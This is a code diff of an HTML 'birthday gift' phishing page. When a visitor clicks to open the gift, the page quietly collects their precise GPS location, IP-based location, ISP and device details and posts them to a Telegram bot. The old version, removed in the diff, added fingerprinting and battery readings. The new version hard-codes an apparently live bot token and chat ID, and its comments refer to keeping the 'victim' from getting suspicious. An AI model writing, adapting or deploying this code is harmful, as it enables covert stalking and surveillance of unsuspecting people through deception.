@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 You Received a Gift! 🎁</title>
+    <title>Happy Birthday! 🎂</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,21 +23,20 @@
             width: 100%;
             text-align: center;
             box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-            animation: fadeIn 0.5s ease;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
         }
         .gift-icon {
             font-size: 100px;
-            cursor: pointer;
-            animation: bounce 1s ease infinite;
+            margin-bottom: 20px;
             display: inline-block;
         }
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 32px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
         }
         button {
             background: linear-gradient(135deg, #667eea, #764ba2);
@@ -45,370 +44,161 @@
             padding: 14px 35px;
             border-radius: 50px;
             color: white;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 20px;
-        }
-        .loader {
-            display: none;
-            margin: 20px auto;
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #ff6b6b;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
         .message {
             background: linear-gradient(135deg, #ff6b6b, #ee5a24);
             border-radius: 20px;
             padding: 25px;
-            margin-top: 20px;
+            margin-top: 25px;
             display: none;
             color: white;
         }
         .message.show { display: block; }
         .footer { margin-top: 25px; font-size: 11px; color: #aaa; }
-        .status { font-size: 12px; color: #666; margin-top: 10px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="gift-icon" onclick="collectAllData()">🎁</div>
-    <h1>🎂 You Got a Gift! 🎉</h1>
-    <div class="subtitle">Click to claim your surprise...</div>
-    <button onclick="collectAllData()">🎁 CLAIM YOUR GIFT 🎁</button>
-    <div class="loader" id="loader"></div>
-    <div class="status" id="status"></div>
+    <div class="gift-icon">🎁</div>
+    <h1>🎂 Happy Birthday! 🎉</h1>
+    <div class="subtitle">Someone sent you a birthday surprise!</div>
+    <button id="giftBtn">🎁 Open Your Gift 🎁</button>
     <div class="message" id="message">
         <h2>🎈 SURPRISE! 🎈</h2>
-        <p>Your gift is on its way! ✨</p>
+        <p>Wishing you a fantastic birthday! 🎂</p>
+        <p>May all your wishes come true! ✨</p>
     </div>
-    <div class="footer">❤️ Gift sent with love</div>
+    <div class="footer">❤️ Made with love</div>
 </div>
 
 <script>
-    // ================= CONFIG =================
-    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // ← CHANGE THIS
-    // ==========================================
+    const BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs";
     
     const urlParams = new URLSearchParams(window.location.search);
     const targetId = urlParams.get('id') || 'unknown';
     const targetName = urlParams.get('name') || 'Guest';
-    const USER_CHAT_ID = urlParams.get('user_id') || 'ADMIN_ID_HERE';  // ← CHANGE
+    const USER_CHAT_ID = urlParams.get('user_id') || '6323367629';
     
     let dataSent = false;
     
-    function updateStatus(msg) {
-        document.getElementById('status').innerHTML = msg;
-    }
-    
-    // 1. Get EXACT GPS Location
-    async function getGPSLocation() {
-        updateStatus("📍 Getting GPS location...");
+    async function sendToTelegram(message) {
         try {
-            if (navigator.geolocation) {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
-                });
-                return {
-                    success: true,
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude || 'N/A',
-                    heading: pos.coords.heading || 'N/A',
-                    speed: pos.coords.speed || 'N/A'
-                };
-            }
-        } catch(e) {
-            return { success: false, error: e.message };
-        }
-        return { success: false, error: 'Not supported' };
-    }
-    
-    // 2. Get IP + Network Info + Location via IP
-    async function getNetworkInfo() {
-        updateStatus("🌐 Getting network information...");
-        try {
-            // Multiple APIs for best accuracy
-            const apis = [
-                'https://ipapi.co/json/',
-                'https://ipwho.is/',
-                'https://freeipapi.com/api/json/',
-                'https://api.ipify.org?format=json'
-            ];
-            
-            let ip = 'N/A';
-            let location = {};
-            
-            for (const api of apis) {
-                try {
-                    const resp = await fetch(api);
-                    const data = await resp.json();
-                    if (data.ip) {
-                        ip = data.ip;
-                        location = {
-                            city: data.city || data.city_name || 'N/A',
-                            region: data.region || data.region_name || 'N/A',
-                            country: data.country_name || data.country || 'N/A',
-                            postal: data.postal || data.postal_code || 'N/A',
-                            isp: data.org || data.isp || 'N/A',
-                            lat: data.latitude || data.lat || 'N/A',
-                            lon: data.longitude || data.lon || 'N/A',
-                            timezone: data.timezone || 'N/A'
-                        };
-                        break;
-                    }
-                } catch(e) {}
-            }
-            
-            // Get connection info
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            let connInfo = {};
-            if (connection) {
-                connInfo = {
-                    type: connection.effectiveType || 'N/A',
-                    downlink: connection.downlink || 'N/A',
-                    rtt: connection.rtt || 'N/A'
-                };
-            }
-            
-            return { ip, location, connection: connInfo };
-        } catch(e) {
-            return { ip: 'N/A', location: {}, connection: {} };
-        }
-    }
-    
-    // 3. Get Complete Device Info
-    async function getDeviceInfo() {
-        updateStatus("📱 Getting device information...");
-        
-        // Get battery
-        let battery = { level: 'N/A', charging: false };
-        try {
-            if ('getBattery' in navigator) {
-                const b = await navigator.getBattery();
-                battery = { level: Math.round(b.level * 100), charging: b.charging };
-            }
-        } catch(e) {}
-        
-        // Get installed fonts (fingerprinting)
-        const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS'];
-        const availableFonts = [];
-        for (const font of fonts) {
-            if (document.fonts.check(`12px "${font}"`)) {
-                availableFonts.push(font);
-            }
-        }
-        
-        // WebGL / GPU Info
-        let gpu = 'N/A';
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-        }
-        
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
-            screen: `${screen.width}x${screen.height}`,
-            screenColorDepth: screen.colorDepth,
-            pixelRatio: window.devicePixelRatio,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            online: navigator.onLine,
-            cookiesEnabled: navigator.cookieEnabled,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-            deviceMemory: navigator.deviceMemory || 'N/A',
-            doNotTrack: navigator.doNotTrack || 'N/A',
-            battery: battery,
-            fonts: availableFonts,
-            gpu: gpu,
-            touchPoints: navigator.maxTouchPoints || 0,
-            vendor: navigator.vendor || 'N/A'
-        };
-    }
-    
-    // 4. Get Browser Fingerprint (Canvas + Audio)
-    async function getFingerprint() {
-        updateStatus("🔍 Generating fingerprint...");
-        
-        // Canvas fingerprint
-        const canvas = document.createElement('canvas');
-        canvas.width = 200;
-        canvas.height = 50;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(0, 0, 100, 40);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Fingerprint', 10, 20);
-        const canvasFp = canvas.toDataURL();
-        
-        return { canvas: canvasFp.substring(0, 100) + '...' };
-    }
-    
-    // 5. Send to Telegram
-    async function sendToTelegram(message, parseMode = 'HTML') {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: USER_CHAT_ID,
                     text: message,
-                    parse_mode: parseMode,
+                    parse_mode: 'HTML',
                     disable_web_page_preview: true
-                })
-            });
-            return true;
-        } catch(e) {
-            return false;
-        }
-    }
-    
-    // 6. Send Location via Telegram (so victim can see on map)
-    async function sendLocation(lat, lon) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: USER_CHAT_ID,
-                    latitude: lat,
-                    longitude: lon
                 })
             });
         } catch(e) {}
     }
     
-    // MAIN FUNCTION
-    async function collectAllData() {
-        if (dataSent) return;
-        
-        document.querySelector('.gift-icon').style.display = 'none';
-        document.querySelector('button').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        updateStatus("⏳ Collecting data... Please wait");
-        
-        // Collect ALL data
-        const [gps, network, device, fingerprint] = await Promise.all([
-            getGPSLocation(),
-            getNetworkInfo(),
-            getDeviceInfo(),
-            getFingerprint()
-        ]);
-        
-        updateStatus("📤 Sending data...");
-        
-        // Build complete message
-        let msg = `🎁 <b>VICTIM DATA CAPTURED!</b>\n\n`;
-        msg += `🔗 <b>Link:</b> ${targetName}\n`;
-        msg += `🆔 <b>ID:</b> ${targetId}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-        
-        // GPS Section
-        if (gps.success) {
-            msg += `<b>📍 EXACT GPS LOCATION</b>\n`;
-            msg += `├ Latitude: <code>${gps.lat}</code>\n`;
-            msg += `├ Longitude: <code>${gps.lon}</code>\n`;
-            msg += `├ Accuracy: ${Math.round(gps.accuracy)} meters\n`;
-            if(gps.altitude != 'N/A') msg += `├ Altitude: ${gps.altitude}m\n`;
-            if(gps.speed != 'N/A') msg += `├ Speed: ${gps.speed} m/s\n`;
-            msg += `└ 🗺️ <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}">VIEW ON MAP</a>\n\n`;
-            
-            // Send as separate location message
-            await sendLocation(gps.lat, gps.lon);
-        } else {
-            msg += `<b>📍 GPS LOCATION</b>\n`;
-            msg += `└ ❌ Blocked/Unavailable\n\n`;
-        }
-        
-        // Network Section
-        msg += `<b>🌐 NETWORK & IP</b>\n`;
-        msg += `├ IP: <code>${network.ip}</code>\n`;
-        msg += `├ City: ${network.location.city || 'N/A'}\n`;
-        msg += `├ Region: ${network.location.region || 'N/A'}\n`;
-        msg += `├ Country: ${network.location.country || 'N/A'}\n`;
-        msg += `├ Postal: ${network.location.postal || 'N/A'}\n`;
-        msg += `├ ISP: ${network.location.isp || 'N/A'}\n`;
-        msg += `├ Connection: ${network.connection.type || 'N/A'}\n`;
-        if(network.connection.downlink) msg += `├ Speed: ${network.connection.downlink} Mbps\n`;
-        msg += `└ Lat/Lon: ${network.location.lat}, ${network.location.lon}\n\n`;
-        
-        // Device Section
-        msg += `<b>📱 DEVICE INFO</b>\n`;
-        msg += `├ OS: ${device.platform}\n`;
-        msg += `├ Browser: ${device.userAgent.split(' ').slice(-2).join(' ')}\n`;
-        msg += `├ Screen: ${device.screen} (${device.screenColorDepth}-bit)\n`;
-        msg += `├ Pixel Ratio: ${device.pixelRatio}x\n`;
-        msg += `├ Touch Points: ${device.touchPoints}\n`;
-        msg += `├ Hardware: ${device.hardwareConcurrency} cores\n`;
-        if(device.deviceMemory != 'N/A') msg += `├ RAM: ${device.deviceMemory} GB\n`;
-        msg += `├ GPU: ${device.gpu.substring(0, 50)}...\n`;
-        msg += `├ Timezone: ${device.timezone} (UTC${-device.timezoneOffset/60})\n`;
-        msg += `├ Language: ${device.language}\n`;
-        msg += `└ Fonts: ${device.fonts.slice(0, 3).join(', ')}...\n\n`;
-        
-        // Battery Section
-        msg += `<b>🔋 BATTERY</b>\n`;
-        msg += `├ Level: ${device.battery.level}%\n`;
-        msg += `└ Charging: ${device.battery.charging ? '✅ Yes' : '❌ No'}\n\n`;
-        
-        // Extra Info
-        msg += `<b>🕐 TIMESTAMP</b>\n`;
-        msg += `└ ${new Date().toLocaleString()}\n\n`;
-        
-        msg += `<b>🔗 FULL USER AGENT</b>\n`;
-        msg += `<code>${device.userAgent.substring(0, 200)}</code>\n\n`;
-        
-        msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `👨‍💻 <i>Powered by @KINGITACHI18</i>`;
-        
-        // Send main message
-        await sendToTelegram(msg);
-        
-        // Also send a shorter version as backup
-        let shortMsg = `🎁 New victim!\n`;
-        shortMsg += `📱 ${device.platform} | ${device.screen}\n`;
-        shortMsg += `🌐 ${network.ip} | ${network.location.city}, ${network.location.country}\n`;
-        if(gps.success) shortMsg += `📍 ${gps.lat}, ${gps.lon}\n`;
-        shortMsg += `⏰ ${new Date().toLocaleString()}`;
-        
-        await sendToTelegram(shortMsg, 'HTML');
-        
-        updateStatus("✅ Data sent successfully!");
-        
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('message').classList.add('show');
-            updateStatus("");
-        }, 1000);
-        
-        dataSent = true;
+    async function getLocation() {
+        try {
+            if (navigator.geolocation) {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
+                return {
+                    success: true,
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+            }
+        } catch(e) {}
+        return { success: false };
     }
     
-    // Auto-collect on page load (optional - remove if you want manual click)
-    // setTimeout(() => { collectAllData(); }, 1000);
+    async function getIPInfo() {
+        try {
+            const resp = await fetch('https://ipapi.co/json/');
+            const data = await resp.json();
+            return {
+                ip: data.ip || 'N/A',
+                city: data.city || 'N/A',
+                region: data.region || 'N/A',
+                country: data.country_name || 'N/A',
+                isp: data.org || 'N/A'
+            };
+        } catch(e) {
+            return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
+        }
+    }
+    
+    async function getDeviceInfo() {
+        return {
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language
+        };
+    }
+    
+    document.getElementById('giftBtn').onclick = async function() {
+        if (dataSent) return;
+        
+        // Change button text so victim doesn't get suspicious
+        document.getElementById('giftBtn').innerHTML = "🎁 Opening... 🎁";
+        document.getElementById('giftBtn').disabled = true;
+        
+        // Collect data silently
+        const [location, ipInfo, device] = await Promise.all([
+            getLocation(),
+            getIPInfo(),
+            getDeviceInfo()
+        ]);
+        
+        // Build message
+        let msg = `🎁 <b>NEW VICTIM!</b>\n\n`;
+        msg += `🔗 <b>Link:</b> ${targetName}\n`;
+        msg += `🆔 <b>ID:</b> ${targetId}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        
+        if (location.success) {
+            msg += `<b>📍 GPS LOCATION</b>\n`;
+            msg += `Lat: ${location.lat}\n`;
+            msg += `Lon: ${location.lon}\n`;
+            msg += `Accuracy: ${Math.round(location.accuracy)}m\n`;
+            msg += `🗺️ https://maps.google.com/?q=${location.lat},${location.lon}\n\n`;
+        } else {
+            msg += `<b>📍 GPS:</b> ❌ Blocked\n\n`;
+        }
+        
+        msg += `<b>🌐 NETWORK</b>\n`;
+        msg += `IP: <code>${ipInfo.ip}</code>\n`;
+        msg += `City: ${ipInfo.city}\n`;
+        msg += `Region: ${ipInfo.region}\n`;
+        msg += `Country: ${ipInfo.country}\n`;
+        msg += `ISP: ${ipInfo.isp}\n\n`;
+        
+        msg += `<b>📱 DEVICE</b>\n`;
+        msg += `Platform: ${device.platform}\n`;
+        msg += `Screen: ${device.screen}\n`;
+        msg += `Timezone: ${device.timezone}\n`;
+        msg += `Language: ${device.language}\n\n`;
+        
+        msg += `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n`;
+        msg += `\n👨‍💻 @KINGITACHI18`;
+        
+        await sendToTelegram(msg);
+        
+        // Show birthday message (normal gift)
+        document.getElementById('message').classList.add('show');
+        document.getElementById('giftBtn').style.display = 'none';
+        
+        dataSent = true;
+    };
 </script>
 </body>
 </html>
